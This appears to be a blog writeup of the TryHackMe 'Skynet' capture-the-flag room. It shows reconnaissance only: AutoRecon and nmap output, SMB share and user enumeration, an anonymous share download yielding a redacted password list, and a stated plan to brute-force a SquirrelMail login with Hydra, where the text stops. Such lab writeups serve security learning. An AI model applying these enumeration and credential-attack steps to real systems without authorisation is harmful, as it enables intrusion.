---
title: "Skynet_writeup.sh"
date: 2020-08-25T20:59:31-04:00
draft: false
toc: false
images:
  - "img/skynet_cover.gif"
cover: "img/skynet_cover.gif"
tags:
  - hacking
  - tryHackme
  - writeups
---

# Skynet THM Room


This is a quick writeup or another "just-me-taking-notes" thing for Skynet TryhackMe's room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)

Enjoy!

- Please visit This room on TryHackMe by [clicking this link](https://tryhackme.com/room/skynet).
- **PLEASE NOTE:** Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.
- Donwload Autorecon by clicking [this](https://github.com/Tib3rius/AutoRecon) link.


[Task 1] Deploy and compromise the vulnerable machine! 
------------------------------------------------------

Let's start by doing some recon, some multithreaded reacon. We'll try out autorecon this time.

```bash
kali@kali:~$ autorecon 10.10.128.90
[*] Scanning target 10.10.128.90
[*] Running service detection nmap-quick on 10.10.128.90
[*] Running service detection nmap-full-tcp on 10.10.128.90
[*] Running service detection nmap-top-20-udp on 10.10.128.90
[!] Service detection nmap-top-20-udp on 10.10.128.90 returned non-zero exit code: 1
[*] [20:26:19] - There are 2 tasks still running on 10.10.128.90
[*] [20:27:19] - There are 2 tasks still running on 10.10.128.90
[*] Service detection nmap-quick on 10.10.128.90 finished successfully in 2 minutes, 27 seconds
[*] Found ssh on tcp/22 on target 10.10.128.90
[*] Found http on tcp/80 on target 10.10.128.90
[*] Found pop3 on tcp/110 on target 10.10.128.90
[*] Found netbios-ssn on tcp/139 on target 10.10.128.90
[!] [tcp/139/nbtscan] Scan cannot be run against tcp port 139. Skipping.
[*] Found imap on tcp/143 on target 10.10.128.90
[*] Found netbios-ssn on tcp/445 on target 10.10.128.90
[!] [tcp/445/enum4linux on 10.10.128.90] Scan should only be run once and it appears to have already been queued. Skipping.
[!] [tcp/445/nbtscan] Scan cannot be run against tcp port 445. Skipping.
[!] [tcp/445/smbclient on 10.10.128.90] Scan should only be run once and it appears to have already been queued. Skipping.
[*] Running task tcp/22/sslscan on 10.10.128.90
[*] Running task tcp/22/nmap-ssh on 10.10.128.90
[*] Running task tcp/80/sslscan on 10.10.128.90
[*] Running task tcp/80/nmap-http on 10.10.128.90
[*] Running task tcp/80/curl-index on 10.10.128.90
[*] Running task tcp/80/curl-robots on 10.10.128.90
[*] Running task tcp/80/wkhtmltoimage on 10.10.128.90
[*] Running task tcp/80/whatweb on 10.10.128.90
[*] Running task tcp/80/nikto on 10.10.128.90
[*] Task tcp/22/sslscan on 10.10.128.90 finished successfully in less than a second
[*] Task tcp/80/sslscan on 10.10.128.90 finished successfully in less than a second
[*] Running task tcp/80/gobuster on 10.10.128.90
[*] Running task tcp/110/sslscan on 10.10.128.90
[*] Task tcp/110/sslscan on 10.10.128.90 finished successfully in less than a second
[*] Running task tcp/110/nmap-pop3 on 10.10.128.90
[*] Task tcp/80/curl-robots on 10.10.128.90 finished successfully in 1 second
[*] Running task tcp/139/sslscan on 10.10.128.90
[*] Task tcp/80/curl-index on 10.10.128.90 finished successfully in 1 second
[*] Running task tcp/139/nmap-smb on 10.10.128.90
[*] Task tcp/139/sslscan on 10.10.128.90 finished successfully in less than a second
[*] Running task tcp/139/enum4linux on 10.10.128.90
[*] Task tcp/80/wkhtmltoimage on 10.10.128.90 finished successfully in 3 seconds
[*] Running task tcp/139/smbclient on 10.10.128.90
[*] Task tcp/110/nmap-pop3 on 10.10.128.90 finished successfully in 4 seconds
[*] Running task tcp/139/smbmap-share-permissions on 10.10.128.90
[*] Task tcp/139/smbclient on 10.10.128.90 finished successfully in 4 seconds
[*] Running task tcp/139/smbmap-list-contents on 10.10.128.90
[*] Task tcp/80/whatweb on 10.10.128.90 finished successfully in 8 seconds
[*] Running task tcp/139/smbmap-execute-command on 10.10.128.90
[*] Task tcp/22/nmap-ssh on 10.10.128.90 finished successfully in 11 seconds
[*] Running task tcp/143/sslscan on 10.10.128.90
[*] Task tcp/143/sslscan on 10.10.128.90 finished successfully in less than a second
[*] Running task tcp/143/nmap-imap on 10.10.128.90
[*] Task tcp/143/nmap-imap on 10.10.128.90 finished successfully in 5 seconds
[*] Running task tcp/445/sslscan on 10.10.128.90
[*] Task tcp/445/sslscan on 10.10.128.90 finished successfully in less than a second
[*] Running task tcp/445/nmap-smb on 10.10.128.90
[*] Task tcp/139/smbmap-execute-command on 10.10.128.90 finished successfully in 9 seconds
[*] Running task tcp/445/smbmap-share-permissions on 10.10.128.90
[*] Task tcp/139/smbmap-share-permissions on 10.10.128.90 finished successfully in 28 seconds
[*] Running task tcp/445/smbmap-list-contents on 10.10.128.90
[*] [20:28:19] - There are 10 tasks still running on 10.10.128.90
[*] Task tcp/445/smbmap-share-permissions on 10.10.128.90 finished successfully in 26 seconds
[*] Running task tcp/445/smbmap-execute-command on 10.10.128.90
[*] Task tcp/445/smbmap-execute-command on 10.10.128.90 finished successfully in 7 seconds
[*] Task tcp/139/smbmap-list-contents on 10.10.128.90 finished successfully in 49 seconds
[*] Task tcp/445/smbmap-list-contents on 10.10.128.90 finished successfully in 1 minute, less than a second
[*] [20:29:19] - There are 7 tasks still running on 10.10.128.90
[*] Task tcp/139/enum4linux on 10.10.128.90 finished successfully in 2 minutes, 22 seconds
[*] [20:30:19] - There are 6 tasks still running on 10.10.128.90
[*] Task tcp/80/nmap-http on 10.10.128.90 finished successfully in 2 minutes, 53 seconds
[*] [20:31:19] - There are 5 tasks still running on 10.10.128.90
[*] [20:32:19] - There are 5 tasks still running on 10.10.128.90
[*] Task tcp/139/nmap-smb on 10.10.128.90 finished successfully in 5 minutes, less than a second
[*] [20:33:19] - There are 4 tasks still running on 10.10.128.90
[*] Task tcp/445/nmap-smb on 10.10.128.90 finished successfully in 5 minutes, 51 seconds
[*] [20:34:19] - There are 3 tasks still running on 10.10.128.90
[*] [20:35:19] - There are 3 tasks still running on 10.10.128.90
[*] [20:36:19] - There are 3 tasks still running on 10.10.128.90
[*] [20:37:19] - There are 3 tasks still running on 10.10.128.90
[*] [20:38:19] - There are 3 tasks still running on 10.10.128.90
[*] Task tcp/80/nikto on 10.10.128.90 finished successfully in 11 minutes, 20 seconds
[*] [20:39:19] - There are 2 tasks still running on 10.10.128.90

```

Ìf we review enum4linux results we see a username **milesdyson**

```bash
 ============================= 
|    Users on 10.10.128.90    |
 ============================= 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson	Name: 	Desc: 

user:[milesdyson] rid:[0x3e8]
	User Name   :	milesdyson
	Full Name   :	
	Home Drive  :	\\skynet\milesdyson
	Dir Drive   :	
	Profile Path:	\\skynet\milesdyson\profile
```

We also get some SMB shares:

```bash
 ========================================= 
|    Share Enumeration on 10.10.128.90    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.128.90
//10.10.128.90/print$	Mapping: DENIED, Listing: N/A
//10.10.128.90/anonymous	Mapping: OK, Listing: OK
//10.10.128.90/milesdyson	Mapping: DENIED, Listing: N/A
//10.10.128.90/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

```

Let's see to what gobuster found:

```bash
/.hta (Status: 403) [Size: 277]
/.hta.asp (Status: 403) [Size: 277]
/.hta.aspx (Status: 403) [Size: 277]
/.hta.jsp (Status: 403) [Size: 277]
/.hta.txt (Status: 403) [Size: 277]
/.hta.html (Status: 403) [Size: 277]
/.hta.php (Status: 403) [Size: 277]
/.htaccess (Status: 403) [Size: 277]
/.htaccess.asp (Status: 403) [Size: 277]
/.htaccess.aspx (Status: 403) [Size: 277]
/.htaccess.jsp (Status: 403) [Size: 277]
/.htaccess.txt (Status: 403) [Size: 277]
/.htaccess.html (Status: 403) [Size: 277]
/.htaccess.php (Status: 403) [Size: 277]
/.htpasswd (Status: 403) [Size: 277]
/.htpasswd.txt (Status: 403) [Size: 277]
/.htpasswd.html (Status: 403) [Size: 277]
/.htpasswd.php (Status: 403) [Size: 277]
/.htpasswd.asp (Status: 403) [Size: 277]
/.htpasswd.aspx (Status: 403) [Size: 277]
/.htpasswd.jsp (Status: 403) [Size: 277]
/config (Status: 301) [Size: 313]
```

We also got some SMBMap results back with some files on the shares:

```sh
[-] Working on it...
                                
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	Skynet Anonymous Share
	.\anonymous\*
	dr--r--r--                0 Wed Sep 18 00:41:20 2019	.
	dr--r--r--                0 Tue Sep 17 03:20:17 2019	..
	fr--r--r--              163 Tue Sep 17 23:04:59 2019	attention.txt
	dr--r--r--                0 Wed Sep 18 00:42:16 2019	logs
	dr--r--r--                0 Wed Sep 18 00:40:06 2019	books
	.\anonymous\logs\*
	dr--r--r--                0 Wed Sep 18 00:42:16 2019	.
	dr--r--r--                0 Wed Sep 18 00:41:20 2019	..
	fr--r--r--                0 Wed Sep 18 00:42:13 2019	log2.txt
	fr--r--r--              471 Wed Sep 18 00:41:59 2019	log1.txt
	fr--r--r--                0 Wed Sep 18 00:42:16 2019	log3.txt
	.\anonymous\books\*
	dr--r--r--                0 Wed Sep 18 00:40:06 2019	.
	dr--r--r--                0 Wed Sep 18 00:41:20 2019	..
	fr--r--r--         33153722 Wed Sep 18 00:40:02 2019	Introduction to Machine Learning with Python.pdf
	fr--r--r--          4222827 Wed Sep 18 00:40:06 2019	What You Need to Know about Machine Learning.pdf
	fr--r--r--          4986980 Wed Sep 18 00:40:06 2019	Thoughtful Machine Learning with Python.mobi
	fr--r--r--         16433984 Wed Sep 18 00:40:05 2019	Python Machine Learning.pdf
	fr--r--r--         11527855 Wed Sep 18 00:40:05 2019	Reinforcement Learning - With Open AI, TensorFlow and Keras Using Python.pdf
	fr--r--r--          2219430 Wed Sep 18 00:40:02 2019	Machine Learning Using C# Succinctly.pdf
	fr--r--r--         14637798 Wed Sep 18 00:40:05 2019	Python Real World Machine Learning.epub
	fr--r--r--          1961798 Wed Sep 18 00:40:03 2019	Neural Networks Using C# Succinctly.pdf
	fr--r--r--          4900975 Wed Sep 18 00:40:05 2019	Quantum Machine Learning - Peter Wittek.epub
	fr--r--r--           230243 Wed Sep 18 00:40:02 2019	Introduction To Python Programming - Beginner's Guide To Computer Programming And Machine Learning.epub
	fr--r--r--          4561261 Wed Sep 18 00:40:02 2019	Large Scale Machine Learning with Python.pdf
	fr--r--r--         10067139 Wed Sep 18 00:40:03 2019	Mastering Machine Learning with Python in Six Steps.pdf
	fr--r--r--          3816111 Wed Sep 18 00:40:02 2019	Big Data, Data Mining, and Machine Learning.epub
	fr--r--r--          8336682 Wed Sep 18 00:40:05 2019	Python Machine Learning Case Studies.pdf
	fr--r--r--         12445322 Wed Sep 18 00:40:03 2019	Practical Machine Learning.pdf
	fr--r--r--         39999962 Wed Sep 18 00:40:05 2019	Python Machine Learning Blueprints.pdf
	fr--r--r--          7734865 Wed Sep 18 00:40:02 2019	Machine Learning - Hands-On for Developers and Technical Professionals.pdf
	fr--r--r--         25159026 Wed Sep 18 00:40:02 2019	Machine Learning for Developers.pdf
	fr--r--r--          7483357 Wed Sep 18 00:40:05 2019	Python for Probability, Statistics, and Machine Learning.pdf
	fr--r--r--          2976969 Wed Sep 18 00:40:02 2019	A Course in Machine Learning.pdf
	fr--r--r--          6084041 Wed Sep 18 00:40:03 2019	Neural Network Programming with Java.pdf
	fr--r--r--          2192094 Wed Sep 18 00:40:02 2019	Designing Machine Learning Systems with Python.pdf
	fr--r--r--          9548256 Wed Sep 18 00:40:03 2019	Mastering .NET Machine Learning.epub
	fr--r--r--          8059599 Wed Sep 18 00:40:02 2019	Learning Generative Adversarial Networks.epub
	fr--r--r--          4038836 Wed Sep 18 00:40:02 2019	Learning NumPy Array.pdf
	fr--r--r--          4811954 Wed Sep 18 00:40:03 2019	Machine Learning with Spark.pdf
	fr--r--r--          5508789 Wed Sep 18 00:40:03 2019	Machine Learning in Java.pdf
	fr--r--r--         13048518 Wed Sep 18 00:40:03 2019	Machine Learning for the Web.pdf
	fr--r--r--         12029934 Wed Sep 18 00:40:02 2019	Large Scale Machine Learning with Spark.pdf
	fr--r--r--          6896831 Wed Sep 18 00:40:03 2019	Machine Learning in Action.pdf
	fr--r--r--          2632302 Wed Sep 18 00:40:03 2019	Practical Reinforcement Learning.epub
	fr--r--r--          6805939 Wed Sep 18 00:40:02 2019	Building Machine Learning Systems with Python - Second Edition.pdf
	fr--r--r--          1351294 Wed Sep 18 00:40:02 2019	Learning scikit-learn - Machine Learning in Python.pdf
	fr--r--r--          2912524 Wed Sep 18 00:40:05 2019	Python Machine Learning By Example.epub
	fr--r--r--         14525480 Wed Sep 18 00:40:04 2019	Python - Deeper Insights into Machine Learning.pdf
	fr--r--r--         10401548 Wed Sep 18 00:40:02 2019	Machine Learning - Jason Bell.epub
	fr--r--r--          4578898 Wed Sep 18 00:40:03 2019	Microsoft Azure Machine Learning.pdf
	fr--r--r--         23284986 Wed Sep 18 00:40:05 2019	Python Machine Learning Cookbook.pdf
	fr--r--r--          2242317 Wed Sep 18 00:40:02 2019	Advanced Machine Learning with Python.pdf
	fr--r--r--          7245188 Wed Sep 18 00:40:02 2019	Machine Learning Projects for .NET Developers.pdf
	fr--r--r--         16075987 Wed Sep 18 00:40:05 2019	Real-World Machine Learning.pdf
	fr--r--r--          7457736 Wed Sep 18 00:40:06 2019	scikit-learn Cookbook - Second Edition.pdf
	fr--r--r--          4271512 Wed Sep 18 00:40:03 2019	Mastering Machine Learning with scikit-learn - Second Edition.epub
	fr--r--r--          6308460 Wed Sep 18 00:40:02 2019	Machine Learning for Email.epub
	fr--r--r--          8807568 Wed Sep 18 00:40:05 2019	Thoughtful Machine Learning with Python A Test-Driven Approach.pdf
	fr--r--r--          1983841 Wed Sep 18 00:40:06 2019	Using Python to Develop Analytics, Control and Machine Learning Products.pdf
	fr--r--r--          3558541 Wed Sep 18 00:40:02 2019	Building Intelligent Systems - A Guide to Machine Learning Engineering.pdf
	fr--r--r--          1617724 Wed Sep 18 00:40:06 2019	What You Need to Know about R.pdf
	fr--r--r--          8908750 Wed Sep 18 00:40:03 2019	Practical Machine Learning with H2O - Powerful, Scalable Techniques for Deep Learning and AI.pdf
	fr--r--r--         14065243 Wed Sep 18 00:40:03 2019	Machine Learning in Action - 中文版.pdf
	fr--r--r--         24204134 Wed Sep 18 00:40:03 2019	Machine Learning for Hackers.pdf
	fr--r--r--          6656692 Wed Sep 18 00:40:05 2019	Python Machine Learning Cookbook - Early Release.pdf
	milesdyson                                        	NO ACCESS	Miles Dyson Personal Share
	IPC$                                              	NO ACCESS	IPC Service (skynet server (Samba, Ubuntu))
[\] Working on it...
```

Let's see what ssh nmap scan returned:

```sh
# Nmap 7.80 scan initiated Mon Aug 24 20:27:47 2020 as: nmap -vv --reason -Pn -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -oN /home/kali/results/10.10.128.90/scans/tcp_22_ssh_nmap.txt -oX /home/kali/results/10.10.128.90/scans/xml/tcp_22_ssh_nmap.xml 10.10.128.90
Nmap scan report for 10.10.128.90
Host is up, received user-set (0.36s latency).
Scanned at 2020-08-24 20:27:47 EDT for 11s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk=
|   256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
| ssh2-enum-algos: 
|   kex_algorithms: (6)
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (5)
|       ssh-rsa
|       rsa-sha2-512
|       rsa-sha2-256
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 24 20:27:58 2020 -- 1 IP address (1 host up) scanned in 11.46 seconds
```


We also get another set of results back from nmap on port 80:

```sh
# Nmap 7.80 scan initiated Mon Aug 24 20:27:47 2020 as: nmap -vv --reason -Pn -sV -p 80 "--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)" -oN /home/kali/results/10.10.128.90/scans/tcp_80_http_nmap.txt -oX /home/kali/results/10.10.128.90/scans/xml/tcp_80_http_nmap.xml 10.10.128.90
Nmap scan report for 10.10.128.90
Host is up, received user-set (0.36s latency).
Scanned at 2020-08-24 20:27:47 EDT for 173s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-chrono: Request times for /; avg: 798.45ms; min: 774.45ms; max: 828.46ms
|_http-comments-displayer: Couldn't find any comments.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.128.90
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.128.90:80/
|     Form id: 
|_    Form action: #
|_http-date: Tue, 25 Aug 2020 00:28:25 GMT; +30s from local time.
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=<number|all> for deeper analysis)
| http-enum: 
|   /squirrelmail/src/login.php: squirrelmail version 1.4.23 [svn]
|_  /squirrelmail/images/sm_logo.png: SquirrelMail
| http-errors: 
| Spidering limited to: maxpagecount=40; withinhost=10.10.128.90
|   Found the following error pages: 
|   
|   Error Code: 404
|_  	http://10.10.128.90:80/favicon.ico
|_http-feed: Couldn't find any feeds.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-grep: 
|   (1) http://10.10.128.90:80/favicon.ico: 
|     (1) ip: 
|_      + 10.10.128.90
| http-headers: 
|   Date: Tue, 25 Aug 2020 00:28:28 GMT
|   Server: Apache/2.4.18 (Ubuntu)
|   Last-Modified: Tue, 17 Sep 2019 08:58:28 GMT
|   ETag: "20b-592bbec81c0b6"
|   Accept-Ranges: bytes
|   Content-Length: 523
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-malware-host: Host appears to be clean
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-mobileversion-checker: No mobile version detected.
| http-php-version: Logo query returned unknown hash 9d7adb7aa48bcf25afd6593b7df1aacd
|_Credits query returned unknown hash 9d7adb7aa48bcf25afd6593b7df1aacd
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers: 
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; css: 1; png: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; css: 1; png: 1
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Skynet
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
| http-vhosts: 
|_127 names had status 200
|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=<number|all> for deeper analysis)
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 24 20:30:40 2020 -- 1 IP address (1 host up) scanned in 173.37 seconds
```

And we can see some of this summarized on the quick tcp nmap scan results:

```sh
# Nmap 7.80 scan initiated Mon Aug 24 20:25:19 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/results/10.10.128.90/scans/_quick_tcp_nmap.txt -oX /home/kali/results/10.10.128.90/scans/xml/_quick_tcp_nmap.xml 10.10.128.90
Nmap scan report for 10.10.128.90
Host is up, received user-set (0.36s latency).
Scanned at 2020-08-24 20:25:20 EDT for 146s
Not shown: 994 closed ports
Reason: 994 conn-refused
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk=
|   256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        syn-ack Dovecot pop3d
|_pop3-capabilities: SASL TOP CAPA RESP-CODES PIPELINING UIDL AUTH-RESP-CODE
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS ENABLE Pre-login SASL-IR have IDLE post-login listed OK capabilities LITERAL+ more LOGINDISABLEDA0001 ID IMAP4rev1
445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m30s, deviation: 2h53m12s, median: 29s
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 5983/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 42355/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 54521/udp): CLEAN (Failed to receive data)
|   Check 4 (port 45683/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2020-08-24T19:28:04-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-25T00:28:04
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug 24 20:27:46 2020 -- 1 IP address (1 host up) scanned in 147.37 seconds

```

We download some files using an anonymous SMB connection:

```sh

kali@kali:~/Documents/THM/skynet$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
kali@kali:~/Documents/THM/skynet$ smbclient //10.10.128.90/anonymous/
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls -al
NT_STATUS_NO_SUCH_FILE listing \-al
smb: \> ls
  .                                   D        0  Wed Sep 18 00:41:20 2019
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019
  books                               D        0  Wed Sep 18 00:40:06 2019

                9204224 blocks of size 1024. 5370592 blocks available
smb: \> get logs
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \logs
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Wed Sep 18 00:41:20 2019
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5370592 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \logs\> get log2.txt
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \logs\> get log3.txt
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \logs\> exit
kali@kali:~/Documents/THM/skynet$ cat log1.txt 
{list_of_possible_passwords_REDACTED}
kali@kali:~/Documents/THM/skynet$ cat log2.txt
kali@kali:~/Documents/THM/skynet$ cat log3.txt
kali@kali:~/Documents/THM/skynet$ ls
attention.txt  log1.txt  log2.txt  log3.txt  readme.md
kali@kali:~/Documents/THM/skynet$ 

```

We get a very interesting list of possible passwords? usernames? from the **log1.txt** file and as per the **attention.txt** we know the sysadmin requested all users to change passwords.



if we visit the **/squirrelmail** URL we get a webmail login form, let's try our luck with hydra:


We need to capture a login request, I used Burp but you can even when this directly from the Browser. The request gives us all we need to attempt to brute force our way into **Squirrelmail**.

```sh
